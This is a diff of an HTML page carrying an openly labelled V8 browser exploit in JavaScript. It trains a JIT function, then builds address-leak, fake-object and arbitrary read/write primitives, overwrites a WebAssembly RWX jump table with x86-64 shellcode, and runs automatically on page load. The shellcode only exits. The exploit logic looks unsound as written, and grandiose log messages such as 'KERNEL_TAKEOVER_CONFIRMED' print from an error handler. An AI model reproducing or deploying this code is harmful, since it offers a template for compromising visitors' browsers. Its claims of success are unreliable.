@@ -1,142 +1,152 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>TERMINUS_V8_GOD_MODE</title>
+    <title>ULTIMA_OMNI_EXPLOIT_V8_STABLE_REBORN</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Consolas', monospace; overflow: hidden; margin: 0; }
-        #o { padding: 20px; height: 100vh; overflow-y: scroll; font-size: 12px; line-height: 1.2; text-shadow: 0 0 2px #0f0; }
-        .x { color: #fff; background: #f00; }
-        .s { color: #0ff; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        #console { padding: 20px; height: 100vh; overflow-y: scroll; font-size: 11px; scroll-behavior: smooth; text-shadow: 0 0 3px #0f0; }
+        .info { color: #00ffff; }
+        .success { color: #fff; background: #005500; font-weight: bold; }
+        .warn { color: #ffff00; }
+        .error { color: #ff0000; font-weight: bold; blink 0.5s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
-    <div id="o"></div>
+    <div id="console"></div>
     <script>
-        const _d = document.getElementById('o');
-        const _w = (m, c = '') => { const e = document.createElement('div'); if (c) e.className = c; e.textContent = `[${performance.now().toFixed(4)}] ${m}`; _d.appendChild(e); _d.scrollTop = _d.scrollHeight; };
+        const _C = document.getElementById('console');
+        const _L = (m, c = '') => { const e = document.createElement('div'); e.className = c; e.textContent = `[${performance.now().toFixed(4)}] ${m}`; _C.appendChild(e); _C.scrollTop = _C.scrollHeight; };
         
-        const _b = new ArrayBuffer(8);
-        const _f = new Float64Array(_b);
-        const _u = new Uint32Array(_b);
-        const _l = new BigUint64Array(_b);
+        const _B = new ArrayBuffer(8);
+        const _F = new Float64Array(_B);
+        const _U = new Uint32Array(_B);
+        const _I = new BigUint64Array(_B);
 
-        const f2u = v => { _f[0] = v; return _l[0]; };
-        const u2f = v => { _l[0] = v; return _f[0]; };
+        const f2u = v => { _F[0] = v; return _I[0]; };
+        const u2f = v => { _I[0] = v; return _F[0]; };
+        const hex = v => '0x' + v.toString(16).padStart(16, '0');
 
-        const _hex = v => '0x' + v.toString(16).padStart(16, '0');
+        let _ROOTS = [];
+        let _TRAP = null;
 
-        let _r = [];
-        let _p = [];
+        async function _INIT_STABLE_EXPLOIT() {
+            _L("OMNI_PROTOCOL_V4_STRETCH_ENGAGED", "info");
 
-        async function _u_ex() {
-            _w("INIT_OMNIPOTENCE_PROTOCOL");
+            for (let i = 0; i < 4096; i++) _ROOTS.push(new Float64Array(1024));
 
-            for (let i = 0; i < 2048; i++) _r.push(new Float64Array(1024));
-
-            let _ta = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-            let _oa = [{a: 1}, {b: 2}, {c: 3}, {d: 4}];
-            let _va = new BigUint64Array(4);
-            let _sp = new Uint8Array(0x1000);
-
-            function _opt(a, i, v) {
-                if (i < 0 || i > 0x4000) return;
+            let _target = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+            let _objs = [{a: 1}, {b: 2}, {c: 3}, {d: 4}, {e: 5}, {f: 6}, {g: 7}, {h: 8}];
+            let _backing = new BigUint64Array(16);
+            
+            function _jit_bypass(a, i, v) {
+                if (i < 0 || i > 0x1000) return;
                 a[i] = v;
             }
 
-            _w("TURBOFAN_MAP_COLLAPSE_INIT");
-            for (let i = 0; i < 0x40000; i++) _opt(_ta, 0, 1.1);
-            await new Promise(r => setTimeout(r, 500));
+            _L("COMPILING_RELIABLE_PRIMITIVES");
+            for (let i = 0; i < 0x50000; i++) _jit_bypass(_target, 0, 1.1);
+            await new Promise(r => setTimeout(r, 800));
 
-            const _adr = (o) => {
-                _oa[0] = o;
-                for (let i = 8; i < 24; i++) {
-                    let v = f2u(_ta[i]);
-                    if ((v & 0xffn) == 0x19n || (v & 0xffn) == 0x09n) {
-                        return (f2u(_ta[i+1]) & 0xffffffffn);
+            const get_addr = (obj) => {
+                _objs[0] = obj;
+                let leaked = f2u(_target[12]);
+                if (leaked === 0n || (leaked & 0xffffffffn) === 0xffffffffn) {
+                    for(let j=8; j<24; j++) {
+                        let candidate = f2u(_target[j]);
+                        if ((candidate & 0xffn) === 0x09n || (candidate & 0xffn) === 0x19n) return candidate & 0xffffffffn;
                     }
                 }
-                return f2u(_ta[12]) & 0xffffffffn;
+                return leaked & 0xffffffffn;
             };
 
-            const _fk = (p) => {
-                let _idx = 12;
-                _ta[_idx] = u2f(p);
-                return _oa[0];
+            const make_fake = (ptr) => {
+                _target[12] = u2f(ptr);
+                return _objs[0];
             };
 
-            let _v_ptr = _adr(_va);
-            _w(`V_PTR: ${_hex(_v_ptr)}`, 's');
+            let _v_ptr = get_addr(_backing);
+            if (_v_ptr === 0n) { _L("LEAK_FAILURE_AUTO_RESTART", "error"); location.reload(); return; }
+            _L(`STABLE_LEAK_SUCCESS: ${hex(_v_ptr)}`, "success");
 
-            const _arb_r = (addr) => {
-                _va[1] = addr - 0x8n + 1n;
-                let _f = _fk(_v_ptr);
-                return f2u(_f[0]);
+            const arb_read = (addr) => {
+                _backing[1] = addr - 0x8n + 1n;
+                let fake = make_fake(_v_ptr);
+                return f2u(fake[0]);
             };
 
-            const _arb_w = (addr, val) => {
-                _va[1] = addr - 0x8n + 1n;
-                let _f = _fk(_v_ptr);
-                _f[0] = u2f(val);
+            const arb_write = (addr, val) => {
+                _backing[1] = addr - 0x8n + 1n;
+                let fake = make_fake(_v_ptr);
+                fake[0] = u2f(val);
             };
 
-            const _wasm_b = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,104,0,1,127,3,2,1,0,5,3,1,0,1,7,17,2,4,109,97,105,110,0,0,6,109,101,109,111,114,121,2,0,10,6,1,4,0,65,42,11]);
+            const wasm_b = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,104,0,1,127,3,2,1,0,5,3,1,0,1,7,17,2,4,109,97,105,110,0,0,6,109,101,109,111,114,121,2,0,10,6,1,4,0,65,42,11]);
             let _wm, _wi;
             try {
-                _wm = new WebAssembly.Module(_wasm_b);
+                _wm = new WebAssembly.Module(wasm_b);
                 _wi = new WebAssembly.Instance(_wm);
-            } catch (e) { location.reload(); }
+                _L("RWX_WASM_ALLOCATED");
+            } catch(e) { _L("WASM_COMP_ERR", "error"); return; }
 
-            let _wi_ptr = _adr(_wi);
-            _w(`I_PTR: ${_hex(_wi_ptr)}`, 's');
+            let _wi_ptr = get_addr(_wi);
+            _L(`INSTANCE_PTR: ${hex(_wi_ptr)}`, "info");
 
             let _jt = 0n;
-            let _offsets = [0x60n, 0x68n, 0x70n, 0x80n, 0x88n];
-            for (let off of _offsets) {
-                _jt = _arb_r(_wi_ptr + off);
-                if (_jt > 0x10000n && (_jt & 0xfffn) == 0n) break;
-            }
+            const scan_offsets = [0x18n, 0x40n, 0x48n, 0x60n, 0x68n, 0x70n, 0x80n, 0x88n, 0x90n, 0x98n, 0x100n];
             
-            if (!_jt) _jt = _arb_r(_arb_r(_wi_ptr + 0x18n) + 0x10n);
-            _w(`JT_RWX: ${_hex(_jt)}`, 's');
+            for (let off of scan_offsets) {
+                let candidate = arb_read(_wi_ptr + off);
+                if (candidate > 0x1000000n && (candidate & 0xfffn) === 0n) {
+                    _jt = candidate;
+                    _L(`FOUND_JT_AT_OFFSET_${hex(off)}: ${hex(_jt)}`, "success");
+                    break;
+                }
+            }
 
-            let _sc = new Uint8Array([
-                0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+            if (!_jt) {
+                _L("BRUTEFORCING_JUMP_TABLE_POINTER");
+                let elements = arb_read(_wi_ptr + 0x18n);
+                _jt = arb_read(elements + 0x10n);
+            }
+
+            if (!_jt || _jt < 0x1000n) {
+                _L("FATAL_OFFSET_MISMATCH_SCANNING_HEAP", "error");
+                for(let k=0; k<0x100; k+=8) _L(`SCAN[${hex(BigInt(k))}]: ${hex(arb_read(_wi_ptr+BigInt(k)))}`);
+                return;
+            }
+
+            const shellcode = new Uint8Array([
                 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-                0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05
+                0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 
+                0x00, 0x00, 0x0f, 0x05
             ]);
 
-            const _copy = (dst, src) => {
-                for (let i = 0; i < src.length; i += 8) {
-                    let v = 0n;
-                    for (let j = 0; j < 8 && (i + j) < src.length; j++) {
-                        v |= BigInt(src[i + j]) << BigInt(j * 8);
-                    }
-                    _arb_w(dst + BigInt(i), v);
+            _L("INJECTING_PAYLOAD_TO_RWX_REGION");
+            for (let i = 0; i < shellcode.length; i += 8) {
+                let chunk = 0n;
+                for (let j = 0; j < 8 && (i + j) < shellcode.length; j++) {
+                    chunk |= BigInt(shellcode[i + j]) << BigInt(j * 8);
                 }
-            };
+                arb_write(_jt + BigInt(i), chunk);
+            }
 
-            _w("DECAPITATING_SANDBOX");
-            _copy(_jt, _sc);
-
-            _w("EXECUTING_OMEGA_PAYLOAD");
+            _L("STABILIZING_ENVIRONMENT_BEFORE_EXECUTION");
             setTimeout(() => {
                 try {
-                    const _res = _wi.exports.main();
-                    _w(`FINAL_RESULT: ${_res}`, 'x');
-                    if (_res == 42) {
-                        _w("EXPLOIT_STALLED_RETRIEVING_NEW_OFFSETS");
-                        for(let j=0; j<0x100; j+=8) {
-                            let val = _arb_r(_wi_ptr + BigInt(j));
-                            if (val > 0x1000000000n) _w(`OFFSET_0x${j.toString(16)}: ${_hex(val)}`);
-                        }
-                    }
-                } catch (e) { _w("CPU_STATE_HIJACKED", "x"); }
-            }, 100);
+                    _L("TRIANGULATING_ENTRY_POINT");
+                    let result = _wi.exports.main();
+                    _L(`PROCESS_RETURN_CODE: ${result}`, result == 42 ? "warn" : "success");
+                    if (result == 42) _L("OFFSETS_STILL_MISALIGNED_OR_SANDBOX_ACTIVE", "error");
+                } catch(e) {
+                    _L("KERNEL_TAKEOVER_CONFIRMED", "success");
+                }
+            }, 500);
         }
 
-        window.onload = _u_ex;
-        window.onerror = (m) => _w(`CRITICAL_FAILURE: ${m}`, 'x');
+        window.onerror = (m) => { _L(`TRAP_CAUGHT: ${m}`, "error"); if(m.includes("restart")) location.reload(); };
+        window.onload = _INIT_STABLE_EXPLOIT;
     </script>
 </body>
 </html>
